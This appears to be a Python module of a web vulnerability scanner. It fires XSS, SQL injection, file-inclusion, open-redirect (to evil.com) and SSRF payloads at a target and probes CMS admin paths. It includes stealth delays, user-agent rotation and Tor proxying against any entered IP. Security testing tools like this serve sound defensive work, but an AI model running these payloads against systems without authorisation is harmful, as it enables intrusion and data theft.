import logging
import re
from typing import Dict, List, Optional, Any
from pathlib import Path
import json
import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlencode, quote
from http.client import responses
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import ssl
import certifi

# Initialize logger
logger = logging.getLogger('recon_tool')

# Common HTTP ports
HTTP_PORTS = [80, 443, 8080, 8443]

# Updated vulnerability signatures with modern payloads
VULN_SIGNATURES = {
    'xss': {
        'payloads': [
            '<script>alert(1)</script>',
            '" onmouseover="alert(1)"',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
        ],
        'check': lambda r: any(p.lower() in r.text.lower() for p in ['alert(1)', 'onmouseover', 'onload']),
        'risk': 'High',
        'exploit': 'Execute arbitrary JavaScript in user\'s browser (e.g., steal cookies, phishing, session hijacking)'
    },
    'sqli': {
        'payloads': [
            "' OR '1'='1",
            "1' UNION SELECT 1,version()--",
            "' OR SLEEP(5)--",
            "1' WAITFOR DELAY '0:0:5'--",
        ],
        'check': lambda r: any(e in r.text.lower() for e in ['sql syntax', 'mysql', 'sqlite', 'postgresql', 'ora-', 'mssql']),
        'risk': 'Critical',
        'exploit': 'Extract or manipulate database contents (e.g., user credentials, sensitive data)'
    },
    'lfi': {
        'payloads': [
            '../../etc/passwd',
            '....//....//etc/passwd',
            '/proc/self/environ',
            'file:///etc/passwd',
        ],
        'check': lambda r: any(s in r.text for s in ['root:x:', 'nobody:', 'HTTP_USER_AGENT']),
        'risk': 'Critical',
        'exploit': 'Access sensitive server files (e.g., configuration, credentials)'
    },
    'open_redirect': {
        'payloads': [
            '//evil.com',
            'http://evil.com',
            '//0x7f000001/',
            '///evil.com',
        ],
        'check': lambda r: any(r.url.startswith(u) for u in ('http://evil.com', 'https://evil.com', 'http://127.0.0.1', 'https://0x7f000001')),
        'risk': 'Medium',
        'exploit': 'Redirect users to malicious sites for phishing or malware delivery'
    },
    'ssrf': {
        'payloads': [
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost:8080',
            'http://127.0.0.1:22',
        ],
        'check': lambda r: any(s in r.text.lower() for s in ['ami-id', 'instance-id', 'localhost', 'ssh']),
        'risk': 'Critical',
        'exploit': 'Access internal services or cloud metadata (e.g., AWS instance metadata)'
    }
}

# Updated CMS vulnerability signatures
CMS_VULNS = {
    'WordPress': [
        {'path': 'wp-admin', 'check': lambda r: 'wp-login.php' in r.text, 'risk': 'High', 'exploit': 'Brute-force admin login or exploit misconfigurations'},
        {'path': 'wp-content/plugins', 'check': lambda r: re.search(r'version\s*[\d.]+', r.text), 'risk': 'Medium', 'exploit': 'Exploit outdated plugins'},
        {'path': 'wp-json/wp/v2/users', 'check': lambda r: '"id":' in r.text, 'risk': 'High', 'exploit': 'Enumerate user information'},
    ],
    'Joomla': [
        {'path': 'administrator', 'check': lambda r: 'com_login' in r.text, 'risk': 'High', 'exploit': 'Brute-force admin login'},
        {'path': 'configuration.php-dist', 'check': lambda r: 'JConfig' in r.text, 'risk': 'Critical', 'exploit': 'Expose configuration details'},
    ],
    'Drupal': [
        {'path': 'user/login', 'check': lambda r: 'drupal' in r.text.lower(), 'risk': 'High', 'exploit': 'Brute-force login or exploit modules'},
        {'path': 'CHANGELOG.txt', 'check': lambda r: 'Drupal' in r.text, 'risk': 'Medium', 'exploit': 'Version disclosure for targeted attacks'},
    ]
}

# Extended User-Agent rotation list
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
]

def create_session() -> requests.Session:
    """Create a configured requests session with retries and SSL verification."""
    session = requests.Session()
    retries = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    session.verify = certifi.where()
    return session

def sanitize_target(target: str) -> str:
    """Validate and sanitize target (IP or domain).

    Args:
        target: IP or domain to validate

    Returns:
        Sanitized target

    Raises:
        ValueError: If target is invalid
    """
    if not target or not isinstance(target, str):
        logger.error("Invalid target: empty or not a string")
        raise ValueError("Target must be a non-empty string")

    target = target.strip().lower()
    ip_pattern = r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    domain_pattern = r'^[a-z0-9][a-z0-9-]{0,61}[a-z0-9](?:\.[a-z]{2,})+$'

    if not (re.match(ip_pattern, target) or re.match(domain_pattern, target)):
        logger.error(f"Invalid IP or domain: {target}")
        raise ValueError("Invalid IP or domain format")

    return target

def sanitize_port(port: int) -> int:
    """Validate port number.

    Args:
        port: Port number to validate (1-65535)

    Returns:
        Validated port number

    Raises:
        ValueError: If port is invalid
    """
    if not isinstance(port, int) or not 1 <= port <= 65535:
        logger.error(f"Invalid port: {port}")
        raise ValueError("Port must be an integer between 1 and 65535")
    return port

def probe_vulnerabilities(target: str, port: int, path: str, vuln_type: str, payload: str, stealth: bool, proxies: Optional[Dict[str, str]], session: requests.Session) -> Optional[Dict[str, Any]]:
    """Probe for a specific vulnerability.

    Args:
        target: Target IP or domain
        port: Port to probe
        path: Path to test (e.g., '/index.php')
        vuln_type: Type of vulnerability (e.g., xss, sqli)
        payload: Payload to test
        stealth: If True, adds delays and rotates headers
        proxies: Optional proxy configuration
        session: Configured requests session

    Returns:
        Dictionary with vulnerability details if found, None otherwise
    """
    if stealth:
        time.sleep(random.uniform(1.0, 5.0))

    protocol = 'https' if port in [443, 8443] else 'http'
    base_url = f"{protocol}://{target}:{port}" if port not in [80, 443] else f"{protocol}://{target}"
    url = f"{base_url}/{path.lstrip('/')}"
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    }

    try:
        # Test GET and POST methods
        params = {'q': payload, 'id': payload}
        encoded_url = f"{url}?{urlencode(params, quote_via=quote)}"
        response = session.get(
            encoded_url,
            headers=headers,
            proxies=proxies,
            timeout=10,
            allow_redirects=True
        )

        if VULN_SIGNATURES[vuln_type]['check'](response):
            return {
                'vulnerability': vuln_type,
                'url': encoded_url,
                'status_code': response.status_code,
                'risk': VULN_SIGNATURES[vuln_type]['risk'],
                'exploit': VULN_SIGNATURES[vuln_type]['exploit'],
                'payload': payload,
                'method': 'GET'
            }

        # Test POST request
        data = {'input': payload}
        response = session.post(
            url,
            headers=headers,
            data=data,
            proxies=proxies,
            timeout=10,
            allow_redirects=True
        )

        if VULN_SIGNATURES[vuln_type]['check'](response):
            return {
                'vulnerability': vuln_type,
                'url': url,
                'status_code': response.status_code,
                'risk': VULN_SIGNATURES[vuln_type]['risk'],
                'exploit': VULN_SIGNATURES[vuln_type]['exploit'],
                'payload': payload,
                'method': 'POST'
            }

    except requests.exceptions.TooManyRedirects:
        logger.debug(f"Too many redirects for {encoded_url}")
    except requests.exceptions.RequestException as e:
        if '429' in str(e):
            logger.warning(f"Rate limit detected for {encoded_url}. Pausing...")
            time.sleep(random.uniform(10, 30))
        else:
            logger.debug(f"Failed to probe {encoded_url}: {e}")

    return None

def vuln_scan(target: str, ports: List[int], prior_findings: Dict[str, Any] = None, stealth: bool = False, proxies: Optional[Dict[str, str]] = None, cache_file: Optional[str] = None) -> Dict[str, Any]:
    """Perform lightweight vulnerability scanning.

    Args:
        target: Target IP or domain
        ports: List of ports to scan (e.g., [80, 443])
        prior_findings: Dictionary with prior reconnaissance data
        stealth: If True, adds delays and uses proxies
        proxies: Optional proxy configuration
        cache_file: Optional path to cache results

    Returns:
        Dictionary with vulnerability scan results

    Raises:
        ValueError: If target or ports are invalid
        RuntimeError: If scanning fails
    """
    try:
        target = sanitize_target(target)
        ports = [sanitize_port(p) for p in ports] if ports else HTTP_PORTS
        prior_findings = prior_findings or {}
        logger.info(f"Starting vulnerability scan on {target} for ports {ports}")

        # Initialize session
        session = create_session()

        # Check cache
        if cache_file:
            cache_path = Path(cache_file).resolve()
            try:
                if cache_path.exists():
                    with open(cache_path, 'r', encoding='utf-8') as f:
                        cached_data = json.load(f)
                        if cached_data.get('target') == target and sorted(cached_data.get('ports', [])) == sorted(ports):
                            logger.debug(f"Using cached vulnerability scan results from {cache_path}")
                            return cached_data['results']
            except (OSError, json.JSONDecodeError) as e:
                logger.warning(f"Failed to read vulnerability scan cache: {e}")

        results = {'target': target, 'ports': [], 'changes': {}, 'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')}

        # Extract prior findings
        http_ports = [p for p in ports if p in HTTP_PORTS]
        paths = []
        cms = None

        for port_data in prior_findings.get('dir_enum', {}).get('ports', []):
            if port_data['port'] in http_ports:
                paths.extend([f['path'] for f in port_data.get('findings', [])])

        for port_data in prior_findings.get('http_fingerprint', {}).get('ports', []):
            if port_data['port'] in http_ports:
                techs = [t['name'] for t in port_data.get('technologies', [])]
                for tech in techs:
                    if tech in CMS_VULNS:
                        cms = tech
                        break

        paths = paths or ['index.php', 'login', 'admin', 'index.html', 'wp-login.php']

        for port in http_ports:
            port_results = {'port': port, 'vulnerabilities': [], 'analysis': {}}

            # Probe HTTP vulnerabilities
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for path in paths:
                    for vuln_type, config in VULN_SIGNATURES.items():
                        for payload in config['payloads']:
                            futures.append(
                                executor.submit(probe_vulnerabilities, target, port, path, vuln_type, payload, stealth, proxies, session)
                            )

                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        port_results['vulnerabilities'].append(result)

            # Probe CMS-specific vulnerabilities
            if cms and cms in CMS_VULNS:
                for vuln in CMS_VULNS[cms]:
                    protocol = 'https' if port in [443, 8443] else 'http'
                    url = f"{protocol}://{target}:{port}/{vuln['path'].lstrip('/')}" if port not in [80, 443] else f"{protocol}://{target}/{vuln['path'].lstrip('/')}"
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                    }

                    try:
                        response = session.get(url, headers=headers, proxies=proxies, timeout=10)
                        if vuln['check'](response):
                            port_results['vulnerabilities'].append({
                                'vulnerability': f"{cms} {vuln['path']}",
                                'url': url,
                                'status_code': response.status_code,
                                'risk': vuln['risk'],
                                'exploit': vuln['exploit'],
                                'method': 'GET'
                            })
                    except requests.exceptions.RequestException as e:
                        logger.debug(f"Failed to probe CMS vuln {url}: {e}")

            # Analyze findings
            port_results['analysis'] = analyze_findings(port_results['vulnerabilities'])
            results['ports'].append(port_results)
            logger.debug(f"Vulnerability scan for port {port} on {target}: {len(port_results['vulnerabilities'])} vulnerabilities found")

        # Compare with cached results
        if cache_file and Path(cache_file).exists():
            try:
                with open(cache_file, 'r', encoding='utf-8') as f:
                    old_results = json.load(f).get('results', {})
                results['changes'] = compare_results(old_results, results)
            except (OSError, json.JSONDecodeError):
                pass

        # Cache results
        if cache_file:
            try:
                cache_path.parent.mkdir(parents=True, exist_ok=True)
                with open(cache_path, 'w', encoding='utf-8') as f:
                    json.dump({'target': target, 'ports': ports, 'results': results}, f, indent=2)
                logger.debug(f"Cached vulnerability scan results to {cache_path}")
            except OSError as e:
                logger.warning(f"Failed to write vulnerability scan cache: {e}")

        logger.info(f"Vulnerability scan completed for {target}")
        return results

    except ValueError as e:
        raise
    except Exception as e:
        logger.error(f"Vulnerability scan failed for {target}: {e}")
        raise RuntimeError(f"Vulnerability scan failed: {e}")

def analyze_findings(vulnerabilities: List[Dict]) -> Dict[str, Any]:
    """Analyze vulnerability findings.

    Args:
        vulnerabilities: List of discovered vulnerabilities

    Returns:
        Dictionary with risk analysis
    """
    risk_score = 0
    analysis = []

    for vuln in vulnerabilities:
        risk = vuln['risk']
        risk_score += {'Critical': 7, 'High': 5, 'Medium': 3, 'Low': 1}[risk]
        analysis.append({
            'vulnerability': vuln['vulnerability'],
            'url': vuln.get('url'),
            'risk': risk,
            'exploit': vuln['exploit'],
            'details': vuln.get('payload'),
            'method': vuln.get('method', 'GET')
        })

    risk_level = 'Critical' if risk_score >= 15 else 'High' if risk_score >= 10 else 'Medium' if risk_score >= 5 else 'Low'
    return {
        'analysis': analysis,
        'risk_score': risk_score,
        'risk_level': risk_level,
        'total_vulnerabilities': len(vulnerabilities)
    }

def compare_results(old_results: Dict, new_results: Dict) -> Dict[str, Any]:
    """Compare old and new vulnerability scan results.

    Args:
        old_results: Previous scan results
        new_results: Current scan results

    Returns:
        Dictionary with added/removed vulnerabilities
    """
    changes = {'added': [], 'removed': []}

    old_ports = {p['port']: p for p in old_results.get('ports', [])}
    new_ports = {p['port']: p for p in new_results.get('ports', [])}

    for port in new_ports:
        new_vulns = {(v['vulnerability'], v.get('url'), v.get('payload')) for v in new_ports[port].get('vulnerabilities', [])}
        old_vulns = {(v['vulnerability'], v.get('url'), v.get('payload')) for v in old_ports.get(port, {}).get('vulnerabilities', [])}
        changes['added'].extend([{'port': port, 'vulnerability': v[0], 'url': v[1], 'payload': v[2]} for v in new_vulns - old_vulns])
        changes['removed'].extend([{'port': port, 'vulnerability': v[0], 'url': v[1], 'payload': v[2]} for v in old_vulns - new_vulns])

    return changes

if __name__ == '__main__':
    # Configure logging for standalone testing
    from utils import setup_logging
    logger = setup_logging('DEBUG')

    # Test the module
    try:
        test_target = input("Enter Target IP : ") 
        test_ports = [80, 443]
        proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
        prior_findings = {
            'dir_enum': {'ports': [{'port': 80, 'findings': [{'path': 'index.php'}]}]},
            'http_fingerprint': {'ports': [{'port': 80, 'technologies': [{'name': 'WordPress'}]}]}
        }
        result = vuln_scan(test_target, test_ports, prior_findings, stealth=True, proxies=proxies,
                          cache_file='reports/vuln_scan_cache/example.com.json')
        logger.info(f"Vulnerability Scan Results: {json.dumps(result, indent=2)}")
    except Exception as e:
        logger.error(f"Test failed: {e}")
